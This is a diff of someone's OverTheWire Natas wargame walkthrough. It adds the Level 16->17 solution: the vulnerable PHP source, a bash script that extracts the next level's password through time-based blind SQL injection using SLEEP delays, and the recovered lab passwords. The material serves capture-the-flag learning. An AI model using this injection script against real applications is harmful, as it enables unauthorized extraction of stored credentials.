@@ -1034,15 +1034,93 @@ for pos in $(seq 1 $PASS_LEN); do
 	done
 done
 
-echo "Password for natas16: $PASS"
+echo "Password for natas17: $PASS"
 ```
 
 >abs@MacBookPro OverTheWire % ./brute_force_natas16_2.sh 
 ```
-Password for natas16: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+Password for natas17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
 
 # Level 16 -> 17:
+abs@MacBookPro OverTheWire % curl "natas17.natas.labs.overthewire.org/" -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC                                                                       
+```
+<h1>natas17</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+
+Exectly the same as natas15, but it doesn't show me the prints...
+
+It had to do something with timing.
+```
+#!/bin/bash
+
+CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+PASS_LEN=32
+URL="natas17.natas.labs.overthewire.org/index.php"
+LOGIN="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
+PASS=""
+
+for pos in $(seq 1 $PASS_LEN); do
+	for char in $(echo $CHARS | fold -w1); do
+	    SECONDS=0
+		curl $URL -u $LOGIN -s -F "username=natas18\" AND IF(BINARY SUBSTRING(password,$pos,1)=\"$char\", SLEEP(5), 0) -- \"" > /dev/null
+		if [ $SECONDS -ge 5 ]; then
+			PASS+=$char
+			echo "pass so far: $PASS"
+			break
+		fi
+	done
+done
+
+echo "Password for natas18: $PASS"
+```
+
+abs@MacBookPro natas % ./brute_force_natas17.sh
+```
+Password for natas18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+```
+
 # Level 17 -> 18:
 # Level 18 -> 19:
 # Level 19 -> 20:
